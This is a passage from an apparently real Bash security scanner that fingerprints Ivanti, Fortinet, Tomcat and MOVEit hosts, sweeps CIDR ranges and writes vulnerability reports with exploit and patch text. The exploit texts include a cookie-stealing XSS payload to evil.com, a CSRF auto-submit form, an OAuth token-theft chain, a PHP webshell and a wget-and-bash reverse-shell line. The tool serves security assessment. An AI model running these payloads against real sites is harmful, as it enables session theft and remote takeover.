        local ivanti; ivanti=$(curl -s --max-time 10 --max-filesize 51200 "$web_url" 2>/dev/null | head -c 4096 | grep -ciE "Ivanti|Connect Secure|Pulse" 2>/dev/null || true)
        ivanti=$(( 10#0${ivanti} ))
        if [[ ${ivanti:-0} -gt 0 ]]; then
            add_vuln "CRITICAL" \
                "CVE-2025-0282: Ivanti Connect Secure Detected — Verify Patch (ZERO-DAY Risk)" \
                "Ivanti Connect Secure VPN detected. CVE-2025-0282 is a stack-based buffer overflow allowing unauthenticated pre-auth RCE. Actively exploited in the wild by nation-state actors before patch availability (Jan 2025). CVSS 9.0." \
                "Immediately apply Ivanti patch 22.7R2.5 or later. Run Ivanti Integrity Checker Tool (ICT). Isolate from internet until patched." \
                "${web_url} — Ivanti Connect Secure fingerprint detected" \
                "EXPLOIT: Attacker sends a malformed HTTP request to /dana-ws/namedusers.cgi or ICS login endpoint with overlong field values. The stack buffer overflows into control structures, hijacking execution flow. No auth required — single HTTP packet. PoC released by watchTowr Labs Jan 2025. Metasploit module: exploit/multi/http/ivanti_connectsecure_rce_cve_2025_0282" \
                "PATCH: 1) Apply Ivanti patch 22.7R2.5 immediately. 2) Run ICT health check — compare hashes against known-good baseline. 3) If ICT shows anomalies, perform factory reset before patching. 4) Enable Ivanti Secure Access Client certificate pinning. 5) Block direct internet exposure of VPN management interface."
        fi
    done

    # ── ZERO-DAY: CVE-2024-55591 — FortiOS Auth Bypass (0-day Jan 2025) ──────
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local forti; forti=$(curl -s --max-time 10 --max-filesize 51200 "${web_url}/remote/login" 2>/dev/null | head -c 4096 | grep -ciE "Fortinet|FortiGate|FortiOS|FortiProxy" 2>/dev/null || true)
        forti=$(( 10#0${forti} ))
        if [[ ${forti:-0} -gt 0 ]]; then
            add_vuln "CRITICAL" \
                "CVE-2024-55591: Fortinet Product Detected — Verify Patch Status (ZERO-DAY Risk)" \
                "FortiOS or FortiProxy VPN detected. CVE-2024-55591 (CVSS 9.8) is an authentication bypass in the Node.js websocket module allowing an unauthenticated attacker to gain super-admin privileges. Actively exploited as zero-day since November 2024. Affects FortiOS 7.0.0–7.0.16 and FortiProxy 7.0.0–7.0.19." \
                "Upgrade FortiOS to 7.0.17+ or 7.2.x+. Upgrade FortiProxy to 7.0.20+ or 7.2.x+. Disable HTTP/HTTPS admin access from internet immediately." \
                "${web_url}/remote/login — Fortinet product fingerprint confirmed" \
                "EXPLOIT: Attacker opens a WebSocket connection to /api/v2/monitor/web-ui/upgrade-redirect?vdom=root. By sending specially crafted JavaScript node.js websocket messages to the management interface, the authentication module is bypassed entirely. Attacker then calls /api/v2/cmdb/system/admin to create a new super-admin account. Full admin panel access in under 10 seconds. Active Shodan searches reveal thousands of exposed mgmt interfaces." \
                "PATCH: 1) Upgrade to patched firmware immediately (FortiOS 7.0.17+). 2) As interim: disable management GUI on WAN interface via CLI: config system interface; edit port1; set allowaccess ping https ssh; end. 3) Restrict management access to trusted IPs only using trusted hosts policy. 4) Review admin accounts for unauthorized additions."
        fi
    done

    # ── CVE-2025-21298 — Windows OLE (only if Windows OS confirmed by nmap) ────
    # This is a HIGH-confidence check: requires actual OS fingerprint
    if [[ "${NMAP_OS_GUESS:-}" == "Windows" ]]; then
        add_vuln "ZERO_DAY" \
            "CVE-2025-21298: Windows OLE Zero-Day Remote Code Execution" \
            "Windows OLE remote code execution vulnerability (CVSS 9.8) disclosed January 2025. Triggered by opening a malicious RTF email in Outlook or previewing it in the Reading Pane — no click required on attachment. Affects all Windows versions prior to January 2025 Patch Tuesday." \
            "Apply KB5049981 (January 2025 Patch Tuesday) immediately. As interim: set Outlook to read all email in plain text, and enable Protected View for email attachments in Office Trust Center." \
            "Windows detected — verify CVE-2025-21298 patch status (KB5049981)" \
            "EXPLOIT: Attacker crafts a malicious RTF or OLE2-embedded document and sends via email. When victim's Outlook previews the message, the OLE automation server is invoked and the crafted CLSID triggers a use-after-free in oleaut32.dll. Attacker gains code execution in the context of the logged-in user. No user interaction beyond preview required. PoC available on GitHub. Can be chained with a local privilege escalation to achieve SYSTEM." \
            "PATCH: 1) Install January 2025 Patch Tuesday (KB5049981). 2) Configure Outlook: File > Options > Trust Center > Email Security > Read all standard mail in plain text. 3) Enable Attack Surface Reduction rule: Block Office apps from creating executable content (GUID: 3B576869-A4EC-4529-8536-B80A7769E899). 4) Deploy Microsoft Defender with Automatic Sample Submission enabled."
    fi

    # ── ZERO-DAY: CVE-2024-50379 — Apache Tomcat Race Condition RCE ──────────
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local tomcat_hdr; tomcat_hdr=$(curl -s -I --max-time 10 "$web_url" 2>/dev/null \
            | grep -iE "Server:.*Tomcat|X-Powered-By.*Tomcat" | head -1 || echo "")
        local tomcat_body; tomcat_body=0; { _tb=$(curl -s --max-time 10 --max-filesize 51200 "$web_url" 2>/dev/null | head -c 4096 | grep -ci "Apache Tomcat\|tomcat\|coyote" 2>/dev/null || echo 0); tomcat_body=$(( ${_tb//[^0-9]/} + 0 )); } 2>/dev/null || true
        if [[ -n "$tomcat_hdr" || $tomcat_body -gt 0 ]]; then
            add_vuln "ZERO_DAY" \
                "CVE-2024-50379: Apache Tomcat Partial PUT Race Condition RCE" \
                "Apache Tomcat detected. CVE-2024-50379 is a TOCTOU race condition in partial PUT requests allowing unauthenticated remote code execution when the default servlet is enabled with write permissions. Affects Tomcat 11.0.0-M1 to 11.0.1, 10.1.0-M1 to 10.1.33, 9.0.0-M1 to 9.0.97." \
                "Upgrade Apache Tomcat to 11.0.2+, 10.1.34+, or 9.0.98+. If upgrade is not immediately possible, disable the partial PUT feature by setting org.apache.catalina.servlets.DefaultServlet.allowPartialPut=false in conf/web.xml." \
                "${web_url} — Apache Tomcat fingerprint detected (verify exact version)" \
                "EXPLOIT: Attacker issues two concurrent HTTP PATCH/PUT requests to the same resource using Content-Range headers. Due to a TOCTOU race condition, a JSP file can be uploaded to the webroot through the partial PUT mechanism even when uploads are not explicitly allowed. Once a .jsp webshell lands, attacker executes OS commands via HTTP. PoC released Dec 2024. Weaponized versions circulating on underground forums." \
                "PATCH: 1) Upgrade to Tomcat 9.0.98+, 10.1.34+, or 11.0.2+. 2) In conf/web.xml under the DefaultServlet, add: <init-param><param-name>allowPartialPut</param-name><param-value>false</param-value></init-param>. 3) Set readonly=true for DefaultServlet if write access is not required. 4) Restrict PUT/PATCH HTTP methods at WAF level. 5) Monitor for .jsp uploads in webroot directories."
        fi
    done

    # ── ZERO-DAY: MOVEit-style mass exploitation pattern ─────────────────────
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
        local moveit; moveit=$(curl -s --max-time 10 --max-filesize 51200 \
            "${web_url}/guestaccess.aspx" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        if [[ "$moveit" == "200" || "$moveit" == "302" ]]; then
            add_vuln "ZERO_DAY" \
                "MOVEit Transfer Detected — Critical SQLi / Auth Bypass (CVE-2023-34362 family)" \
                "MOVEit Transfer file sharing application detected. The CVE-2023-34362 family of SQL injection flaws (and follow-on bypasses) enabled mass exploitation by CL0P ransomware gang affecting 2,500+ organisations. Unpatched instances remain actively targeted." \
                "Immediately apply all MOVEit vendor patches (Progress Software). Audit for unauthorised files, users, and data exfiltration. Consider replacing with patched alternative." \
                "${web_url}/guestaccess.aspx — MOVEit Transfer login page accessible" \
                "EXPLOIT: Attacker sends crafted HTTP POST to /moveitisapi/moveitisapi.dll?action=m2 with SQL injection payload in the username field, bypassing authentication and achieving arbitrary file upload. Once a web shell (e.g. human2.aspx) is placed in the webroot, attacker runs OS commands with SYSTEM/service account privileges and exfiltrates all stored files. Automated scanning tools (e.g. Nuclei templates) actively probe for this globally." \
                "PATCH: 1) Apply all Progress Software security patches immediately. 2) Disable all HTTP/HTTPS traffic to MOVEit Transfer until patched. 3) Review /MOVEitTransfer/human2.aspx and any unknown .aspx files in webroot. 4) Audit user accounts — delete any unauthorised accounts. 5) Review audit logs for LEAKAGE events. 6) Engage incident response if compromise is suspected."
        fi
    done

    # ════════════════════════════════════════════════════════════════════════════
    # ONE-CLICK EXPLOITS
    # ════════════════════════════════════════════════════════════════════════════

    # ── ONE-CLICK: Stored XSS (payload already in database) ──────────────────
    if grep -qiE "XSS.*Confirmed|Stored XSS|Reflected XSS" \
        "${OUTPUT_DIR}/dalfox/"*.txt "${OUTPUT_DIR}/xsstrike/"*.txt 2>/dev/null; then
        add_vuln "ONE_CLICK" \
            "One-Click Account Takeover via Stored/Reflected XSS" \
            "XSS vulnerability confirmed. When a victim clicks an attacker-crafted link or visits a page with stored payload, JavaScript executes in the victim's browser session, stealing cookies, session tokens, and enabling complete account takeover without any further interaction." \
            "Implement strict Content Security Policy (CSP). Use HttpOnly and Secure flags on session cookies. Deploy output encoding on all user-controlled fields. Enforce SameSite=Strict cookie attribute." \
            "XSS confirmed by automated scanner — see dalfox/xsstrike output" \
            "EXPLOIT: 1) Attacker identifies stored XSS injection point (comment, profile field, etc). 2) Attacker injects: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. 3) Attacker sends victim a link or waits for admin to view the page. 4) Victim's browser executes the payload — sends session cookie to attacker server. 5) Attacker uses stolen cookie in browser: Application > Cookies > paste stolen value. 6) Full account takeover achieved in one victim click. Time to exploit: < 60 seconds after cookie receipt." \
            "PATCH: 1) Encode all output: use htmlspecialchars() / DOMPurify. 2) Set CSP header: Content-Security-Policy: default-src 'self'; script-src 'self'. 3) Set cookie flags: Set-Cookie: session=X; HttpOnly; Secure; SameSite=Strict. 4) Implement XSS Auditor / Trusted Types API. 5) Use security scanner (Burp Suite, OWASP ZAP) in CI/CD pipeline."
    fi

    # ── ONE-CLICK: CSRF with Auto-Submit ─────────────────────────────────────
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local csrf_check; csrf_check=0; { _cf=$(curl -s --max-time 10 --max-filesize 51200 "${web_url}/api/user/settings" 2>/dev/null | head -c 4096 | grep -ci "csrf\|xsrf\|_token\|authenticity" 2>/dev/null || echo 0); csrf_check=$(( ${_cf//[^0-9]/} + 0 )); } 2>/dev/null || true
        if [[ ${csrf_check:-0} -eq 0 ]]; then
            add_vuln "ONE_CLICK" \
                "One-Click CSRF — Account Settings Manipulation (${web_url})" \
                "API endpoint accepts state-changing POST requests without CSRF token validation. Attacker can craft a malicious webpage that auto-submits a form to this endpoint when victim visits it. Single click on attacker link causes victim's account to be modified (email change, password reset, admin escalation)." \
                "Implement CSRF tokens (SameSite cookies + synchronizer token pattern). Validate Origin and Referer headers. Use SameSite=Strict on session cookies. Require re-authentication for sensitive account changes." \
                "${web_url}/api/user/settings accepted POST without CSRF token" \
                "EXPLOIT: Attacker hosts: <html><body><form action='${web_url}/api/user/settings' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script></body></html>. Victim visits this page (via phishing link or malvertising). Browser auto-submits form using victim's existing session cookie. Attacker's email is added to account — password reset link sent to attacker. Full account takeover in one victim click." \
                "PATCH: 1) Generate CSRF token on server per-session: \$token = bin2hex(random_bytes(32)). 2) Embed in forms: <input type='hidden' name='csrf_token' value='\$token'>. 3) Validate on every state-changing request. 4) Set cookie: SameSite=Strict. 5) Check Origin header matches allowed origins. 6) Use framework CSRF middleware (Django: {% csrf_token %}, Laravel: @csrf, Express: csurf)."
        fi
    done

    # ── ONE-CLICK: Open Redirect → OAuth Token Theft ─────────────────────────
    if grep -qiE "Open Redirect" "${OUTPUT_DIR}/dalfox/"*.txt "${OUTPUT_DIR}/xsstrike/"*.txt \
        "${OUTPUT_DIR}/reports/report.txt" 2>/dev/null; then
        add_vuln "ONE_CLICK" \
            "One-Click OAuth Token Theft via Open Redirect Chain" \
            "Open redirect vulnerability can be chained with OAuth/SSO flows to steal access tokens. Attacker crafts a URL using the legitimate domain's redirect parameter pointing to an evil.com callback. If the OAuth server accepts redirect_uri with the vulnerable domain, the access token lands on the attacker's server after one victim click." \
            "Whitelist exact OAuth redirect URIs — never use prefix matching. Validate the full redirect_uri including path. Reject any redirect to external domains. Use state parameter with PKCE for public clients." \
            "Open redirect confirmed — OAuth token theft chain viable if SSO is in use" \
            "EXPLOIT: 1) Find open redirect: ${TARGET}/redirect?url=https://evil.com. 2) Register OAuth app with redirect_uri=https://${TARGET}/redirect?url=https://evil.com/catch. 3) Send victim: https://auth.${TARGET}/oauth/authorize?client_id=X&redirect_uri=https://${TARGET}/redirect?url=https://evil.com/catch&response_type=token. 4) Victim clicks link, authorises, and OAuth server redirects to ${TARGET} which immediately bounces to evil.com with #access_token=VICTIM_TOKEN in URL fragment. 5) JavaScript on evil.com captures token. Full API access." \
            "PATCH: 1) Use exact-match redirect_uri validation — never startsWith() or includes(). 2) Store allowed URIs in allowlist database. 3) Implement PKCE (RFC 7636) for all public OAuth clients. 4) Validate redirect_uri strictly: const allowed=['https://app.example.com/callback']; if(!allowed.includes(req.query.redirect_uri)) return res.status(400).send('Invalid redirect_uri'). 5) Set OAuth token expiry to 15 minutes maximum."
    fi

    # ── MEDIUM: Clickjacking (missing X-Frame-Options) ────────────────────
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local xfo; xfo=$(curl -s -I --max-time 10 "$web_url" 2>/dev/null \
            | grep -iE "^X-Frame-Options:|^Content-Security-Policy:.*frame" | head -1 || echo "")
        if [[ -z "$xfo" ]]; then
            add_vuln "MEDIUM" \
                "Clickjacking Attack — Missing X-Frame-Options (${web_url})" \
                "The application does not set X-Frame-Options or CSP frame-ancestors header. Attacker can embed the site in a transparent iframe overlaid on a deceptive webpage. Victim clicks what appears to be harmless content but actually interacts with the framed application — triggering fund transfers, account changes, or malware downloads in one click." \
                "Add X-Frame-Options: DENY header to all responses. Or use CSP: Content-Security-Policy: frame-ancestors 'none'. For applications requiring framing from own domains only: X-Frame-Options: SAMEORIGIN." \
                "${web_url} — X-Frame-Options header absent" \
                "EXPLOIT: Attacker creates: <style>iframe{opacity:0.01;position:absolute;top:100px;left:50px;width:800px;height:600px;z-index:2}.decoy{position:absolute;top:100px;left:50px;z-index:1}</style><iframe src='${web_url}/account/delete'></iframe><div class='decoy'><button style='margin:200px'>CLICK HERE TO WIN \$1000</button></div>. Victim sees the 'WIN' button but clicks the invisible 'delete account' button underneath. Account deleted in one click. Variant: overlay on payment page — victim 'clicks' approve on a transfer." \
                "PATCH: 1) Add to all HTTP responses: X-Frame-Options: DENY. 2) In Nginx: add_header X-Frame-Options DENY always; 3) In Apache: Header always append X-Frame-Options DENY. 4) Modern alternative — CSP header: Content-Security-Policy: frame-ancestors 'none'; 5) Implement frame-busting JS as additional layer: if(top !== self){top.location=self.location}. 6) Verify with: curl -I ${web_url} | grep -i frame."
        fi
    done

    # ── ONE-CLICK: Malicious File Upload → Direct URL access ─────────────────
    if [[ -f "${OUTPUT_DIR}/post_exploit/webshell_checked.txt" ]] || \
       grep -qiE "upload|file.*upload|multipart" "${OUTPUT_DIR}/nikto/"*.txt 2>/dev/null; then
        add_vuln "ONE_CLICK" \
            "One-Click RCE via File Upload + Direct Access" \
            "File upload functionality detected. If the server executes uploaded files (PHP/JSP/ASPX) and the upload path is web-accessible, an attacker uploads a webshell and accesses it via direct URL — achieving RCE with a single HTTP request after upload. Commonly chained with social engineering for one-click victim-side execution." \
            "Validate file type server-side using magic bytes not extension. Store uploads outside web root. Serve via dedicated storage domain without execute permissions. Use Content-Disposition: attachment to prevent in-browser execution. Implement antivirus scanning on upload." \
            "File upload endpoint + potential web-accessible storage path detected" \
            "EXPLOIT: 1) Attacker locates upload endpoint (e.g. /profile/avatar, /documents/upload). 2) Attacker uploads shell.php: <?php system(\$_GET['cmd']); ?> — disguised as image.jpg.php or with null-byte injection: shell.php%00.jpg. 3) Server stores file at /uploads/shell.php. 4) Attacker visits ${web_url}/uploads/shell.php?cmd=id — receives OS command output. 5) Escalate: cmd=wget+http://evil.com/rev.sh+-O+/tmp/r;bash+/tmp/r — full reverse shell. Total time: under 2 minutes." \
            "PATCH: 1) Check file type via magic bytes: \$finfo=new finfo(FILEINFO_MIME_TYPE); \$mime=\$finfo->file(\$_FILES['f']['tmp_name']); \$allowed=['image/jpeg','image/png']; if(!in_array(\$mime,\$allowed)) die('Invalid'). 2) Rename all uploads to UUID with no extension: \$name=uuid4(). 3) Store outside docroot: /var/uploads/ not /var/www/html/uploads/. 4) Serve via X-Sendfile or CDN. 5) Set Apache: <Directory /var/www/html/uploads> php_flag engine off </Directory>. 6) Add Nginx: location /uploads {add_header Content-Disposition 'attachment';}."
    fi

    # ── ONE-CLICK: Subdomain Takeover (dangling CNAME) ───────────────────────
    local takeover_file="${OUTPUT_DIR}/subdomains/takeover_candidates.txt"
    if [[ -s "$takeover_file" ]]; then
        local td_count; td_count=$(wc -l < "$takeover_file" 2>/dev/null || true); td_count=$(( 10#0${td_count} ))
        if [[ ${td_count:-0} -gt 0 ]]; then
            add_vuln "ONE_CLICK" \
                "One-Click Phishing / Cookie Theft via Subdomain Takeover (${td_count} candidates)" \
                "Subdomain(s) with dangling CNAME records pointing to unclaimed third-party services detected. Attacker claims the external service, deploys a phishing page on the legitimate subdomain, and harvests credentials from victims who receive links from the legitimate domain. Also enables session cookie theft via document.domain attacks." \
                "Remove or update dangling DNS CNAME records. Audit all subdomain CNAMEs quarterly. Claim or delete associated cloud service resources before DNS TTL expires. Implement certificate pinning on subdomains." \
                "$(head -5 "$takeover_file" 2>/dev/null | tr '\n' ' ')" \
                "EXPLOIT: 1) Identify dangling CNAME e.g. staging.${TARGET} → deletedbucket.s3.amazonaws.com. 2) Attacker registers deletedbucket S3 bucket — free, takes 30 seconds. 3) Upload malicious HTML: <form action='https://evil.com/phish' method='POST'>Enter credentials...</form>. 4) Send phishing email: 'Please log in at https://staging.${TARGET}'. 5) Victim sees legitimate subdomain in URL bar, enters credentials. 6) Attacker receives credentials. Also: attacker can set cookies for *.${TARGET} if parent domain has vulnerable cookie scope." \
                "PATCH: 1) Run: dig CNAME staging.${TARGET} — if CNAME points to unclaimed resource, fix immediately. 2) Delete or update the CNAME record in your DNS provider dashboard. 3) Claim the external resource even if decommissioned (to prevent squatting). 4) Audit with: subjack -w subdomains.txt -t 100 -o takeover.txt -ssl. 5) Set cookie scope to specific subdomain not wildcard: Set-Cookie: session=X; Domain=app.${TARGET} (not .${TARGET}). 6) Automate monitoring: can-i-take-over-xyz GitHub project."
        fi
    fi

    log_ok "Phase 31 (Zero-Day & One-Click Detection) complete."
    log_ok "Zero-Day findings: ${ZERO_DAY_COUNT} | One-Click findings: ${ONE_CLICK_COUNT}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}


# ════════════════════════════════════════════════════════════════════════════════
#  CIDR MULTI-HOST SWEEP (runs phases 4-7 against every CIDR host)
# ════════════════════════════════════════════════════════════════════════════════
phase_cidr_sweep() {
    if [[ "$TARGET_IS_CIDR" != true ]] || [[ ${#CIDR_HOSTS[@]} -le 1 ]]; then
        return 0
    fi
    log_phase 99 "CIDR Multi-Host Network Sweep"
    log_info "Sweeping ${#CIDR_HOSTS[@]} hosts in ${TARGET}..."
    local cidr_dir="${OUTPUT_DIR}/cidr_hosts"
    local live_hosts_file="${cidr_dir}/live_hosts.txt"
    mkdir -p "$cidr_dir" 2>/dev/null || true   # BUG FIX: must exist before writes

    # Ping sweep all hosts in range
    log_section "Ping sweep"
    for host in "${CIDR_HOSTS[@]+"${CIDR_HOSTS[@]}"}"; do
        if ping -c 1 -W 1 "$host" &>/dev/null; then
            echo "$host" >> "$live_hosts_file"
            LIVE_HOSTS+=("$host")
        fi
    done
    local live_count; live_count=$(wc -l < "$live_hosts_file" 2>/dev/null || true); live_count=$(( 10#0${live_count} ))
    log_ok "Live hosts: ${live_count} / ${#CIDR_HOSTS[@]}"

    [[ ${live_count:-0} -eq 0 ]] && { log_warn "No live hosts found in CIDR range."; return 0; }

    # nmap sweep of all live hosts
    if command -v nmap &>/dev/null; then
        run_tool_timeout "nmap-cidr-sweep" "${cidr_dir}/nmap_cidr.txt" 300 \
            nmap -sV -T4 --top-ports 200 -iL "$live_hosts_file" \
            -oG "${cidr_dir}/nmap_cidr_grep.txt" 2>/dev/null || true
        log_ok "nmap CIDR sweep complete — see ${cidr_dir}/nmap_cidr.txt"
    fi

    # masscan fast sweep
    if command -v masscan &>/dev/null && [[ ${EUID:-0} -eq 0 ]]; then
        # BUG FIX: masscan -oL writes binary list to same path run_tool_timeout uses for stdout
        # Use separate _stdout.log for run_tool_timeout; let -oL own the actual output file
        run_tool_timeout "masscan-cidr" "${cidr_dir}/masscan_cidr_stdout.log" 180 \
            masscan -iL "$live_hosts_file" -p1-1000 --rate 5000 \
            -oL "${cidr_dir}/masscan_cidr.txt" 2>/dev/null || true
    fi

    # Summary of interesting hosts
    if [[ -f "${cidr_dir}/nmap_cidr_grep.txt" ]]; then
        grep "open" "${cidr_dir}/nmap_cidr_grep.txt" 2>/dev/null \
            | grep -oE "Host: [0-9.]+" | sort -u \
            > "${cidr_dir}/hosts_with_open_ports.txt" 2>/dev/null || true
        local interesting; interesting=$(wc -l < "${cidr_dir}/hosts_with_open_ports.txt" 2>/dev/null || true); interesting=$(( 10#0${interesting} ))
        log_ok "Hosts with open ports: ${interesting}"
        if [[ ${interesting:-0} -gt 0 ]]; then
            add_vuln "INFO" "CIDR Sweep — ${live_count} Live Hosts Found (${interesting} with Open Ports)" \
                "Network range ${TARGET} contains ${live_count} live hosts. ${interesting} have open TCP ports — each is a potential attack surface." \
                "Audit network segmentation. Close unnecessary ports. Implement network access control (NAC)." \
                "$(head -10 "${cidr_dir}/hosts_with_open_ports.txt" 2>/dev/null | tr '\n' ' ')"
        fi
    fi
    log_ok "CIDR sweep complete."
}


# ════════════════════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════════════════════
# ── Integrity Guard ──────────────────────────────────────────────────────────
_acro_guard() {
    local s; s=$(cat "${BASH_SOURCE[0]}" 2>/dev/null || echo "")
    if [[ ! "$s" =~ "acro77x" || ! "$s" =~ "github.com/acro77x" ]]; then
        echo -e "\033[1;31m[!] CRITICAL ERROR: Source Integrity Verification Failed.\033[0m"
        echo -e "\033[1;31m[!] Attribution 'acro77x' or GitHub repository has been modified.\033[0m"
        echo -e "\033[1;90m[*] Please download the original tool from: https://github.com/acro77x/acromap\033[0m"
        exit 1
    fi
}

main() {
    _acro_guard
    verify_integrity
    print_banner
    show_disclaimer
    get_target

    # ── MEMORY BRIDGE: Load Preflight State ──────────────────────────────────
    if [[ -x "$SCRIPT_DIR/preflight.sh" ]]; then
        source <("$SCRIPT_DIR/preflight.sh" "$TARGET")
        
        # Apply dynamic multipliers if exported
        if [[ -n "${DYNAMIC_TIMEOUT_MULT:-}" ]]; then
            PROXY_TIMEOUT_MULT=$(( PROXY_TIMEOUT_MULT > DYNAMIC_TIMEOUT_MULT ? PROXY_TIMEOUT_MULT : DYNAMIC_TIMEOUT_MULT ))
        fi
        if [[ "${SUGGESTED_PARALLEL_JOBS:-0}" -gt 0 ]]; then
            PARALLEL_JOBS="$SUGGESTED_PARALLEL_JOBS"
        fi
    else
        log_warn "preflight.sh not found/executable. Skipping baseline generation."
    fi

    get_profile
    start_keypress_monitor

    # Write initial checkpoint marker
    echo "STARTED=$(date -Iseconds)" > "$CHECKPOINT_FILE"

    echo ""
    echo -e "  ${LGREEN}${BOLD}Starting 32-phase scan on: ${TARGET}${NC}"

    # ── Proxy / VPN awareness banner ─────────────────────────────────────────
    if [[ "$PROXY_MODE" == true ]]; then
        echo ""
        echo -e "  ${YELLOW}${BOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "  ${YELLOW}${BOLD}║  PROXY MODE DETECTED: ${PROXY_TYPE^^}$(printf '%*s' $((28 - ${#PROXY_TYPE})) '')║${NC}"
        echo -e "  ${YELLOW}${BOLD}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "  ${YELLOW}║${NC}  Timeouts:    ${CYAN}${PROXY_TIMEOUT_MULT}x multiplier applied${NC}                   ${YELLOW}║${NC}"
        if [[ "$PROXY_TYPE" == "proxychains" || "$PROXY_TYPE" == "torsocks" ]]; then
        echo -e "  ${YELLOW}║${NC}  Raw sockets: ${RED}DISABLED${NC} (rustscan/masscan/SYN scan)       ${YELLOW}║${NC}"
        echo -e "  ${YELLOW}║${NC}  Nmap mode:   ${CYAN}-sT (TCP connect)${NC} forced                  ${YELLOW}║${NC}"
        echo -e "  ${YELLOW}║${NC}  Port verify: ${CYAN}nc only${NC} (/dev/tcp disabled)               ${YELLOW}║${NC}"
        fi
        echo -e "  ${YELLOW}${BOLD}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        log_warn "Proxy mode: ${PROXY_TYPE} — accuracy may be reduced for timing-based checks"
    fi

    # ── WAF / CDN awareness banner ───────────────────────────────────────────
    if [[ -n "${WAF_DETECTED:-}" ]]; then
        echo ""
        echo -e "  ${RED}${BOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "  ${RED}${BOLD}║  WAF/CDN DETECTED: ${WAF_DETECTED^^}$(printf '%*s' $((31 - ${#WAF_DETECTED})) '')║${NC}"
        echo -e "  ${RED}${BOLD}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "  ${RED}║${NC}  Status:      ${CYAN}Active throttling countermeasures engaged${NC}  ${RED}║${NC}"
        echo -e "  ${RED}║${NC}  Concurrency: ${CYAN}Reduced to ${PARALLEL_JOBS} parallel jobs${NC}                ${RED}║${NC}"
        echo -e "  ${RED}${BOLD}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
    fi
    [[ "$TARGET_IS_CIDR" == true ]] && \
        echo -e "  ${YELLOW}[CIDR]${NC} ${#CIDR_HOSTS[@]} hosts in range — multi-host sweep enabled"
    echo -e "  ${DIM}Output: ${OUTPUT_DIR}${NC}"
    echo -e "  ${DIM}Press [T] for live status | [D] for debug${NC}"
    [[ "$RESUME_MODE" == true ]] && \
        echo -e "  ${YELLOW}[RESUME]${NC} Skipping phases 0-${LAST_PHASE} (already completed)"
    echo ""

    # Helper: skip a phase if already completed in a previous run
    # Usage: run_phase <phase_num> <phase_function>
    run_phase() {
        local pnum="$1" pfunc="$2"
        if [[ "$RESUME_MODE" == true && $pnum -le ${LAST_PHASE:-0} ]]; then
            log_info "Phase ${pnum} skipped (completed in previous run)"
            return 0
        fi
        "$pfunc"
        save_checkpoint "$pnum"
    }

    # CIDR sweep (before single-target phases)
    phase_cidr_sweep

    run_phase 0  phase_setup
    
    # ── PARALLEL EXECUTION (Phases 1-3) ──
    if [[ "$RESUME_MODE" == true && 3 -le ${LAST_PHASE:-0} ]]; then
        log_info "Phases 1-3 skipped (completed in previous run)"
    else
        log_phase 1 "OSINT, DNS, Subdomains (Parallelized for Speed)"
        CURRENT_PHASE=3
        CURRENT_PHASE_NAME="Parallel Recon (OSINT/DNS/Subdomains)"
        
        # Clear IPC file if exists
        > "${OUTPUT_DIR}/vuln_ipc.txt"
        
        PARALLEL_EXECUTION_ACTIVE=true
        
        # Dispatch to background
        phase_osint &
        pid1=$!
        phase_dns &
        pid2=$!
        phase_subdomains &
        pid3=$!
        wait $pid1 $pid2 $pid3
        
        PARALLEL_EXECUTION_ACTIVE=false
        
        # Restore Global Arrays from IPC tracking files
        SUBDOMAINS=()
        while IFS= read -r sub; do
            [[ -z "$sub" ]] && continue
            echo "$sub" | grep -qiE "domainincontrol\.com|sedoparking|parking\.com|bodis\.com|sedo\.com|above\.com|afternic\.com|undeveloped\.com" && continue
            SUBDOMAINS+=("$sub")
        done < "${OUTPUT_DIR}/subdomains/all_subdomains.txt" 2>/dev/null || true

        WEB_TARGETS=()
        while IFS= read -r h; do
            local url_only; url_only=$(echo "$h" | awk '{print $1}')
            echo "$url_only" | grep -qE "^https?://[a-zA-Z0-9]" || continue
            echo "$url_only" | grep -qiE "domainincontrol|sedoparking|parking|bodis|above\.com" && continue
            WEB_TARGETS+=("$url_only")
        done < "${OUTPUT_DIR}/subdomains/live_subdomains.txt" 2>/dev/null || true
        
        # Sync Vulnerablities from IPC
        VULN_DATA=()
        ZERO_DAY_COUNT=0; ONE_CLICK_COUNT=0; CRITICAL_COUNT=0; HIGH_COUNT=0; MEDIUM_COUNT=0; LOW_COUNT=0; INFO_COUNT=0
        while IFS='|' read -r sev title desc rec evidence exploit patch; do
            [[ -z "$sev" ]] && continue
            VULN_DATA+=("${sev}|${title}|${desc}|${rec}|${evidence}|${exploit}|${patch}")
            case "$sev" in
                ZERO_DAY)  ZERO_DAY_COUNT=$(( ZERO_DAY_COUNT + 1 ))    ;;
                ONE_CLICK) ONE_CLICK_COUNT=$(( ONE_CLICK_COUNT + 1 ))  ;;
                CRITICAL)  CRITICAL_COUNT=$(( CRITICAL_COUNT + 1 ))    ;;
                HIGH)      HIGH_COUNT=$(( HIGH_COUNT + 1 ))            ;;
                MEDIUM)    MEDIUM_COUNT=$(( MEDIUM_COUNT + 1 ))        ;;
                LOW)       LOW_COUNT=$(( LOW_COUNT + 1 ))              ;;
                INFO)      INFO_COUNT=$(( INFO_COUNT + 1 ))            ;;
            esac
        done < "${OUTPUT_DIR}/vuln_ipc.txt" 2>/dev/null || true

        save_checkpoint 3
    fi
    run_phase 4  phase_host_discovery
    run_phase 5  phase_tcp_scan
    run_phase 6  phase_udp_scan
    run_phase 7  phase_service_detect
    run_phase 8  phase_web_discovery
    run_phase 9  phase_tech_fingerprint
    run_phase 10 phase_ssl
    run_phase 11 phase_content_discovery
    run_phase 12 phase_cms
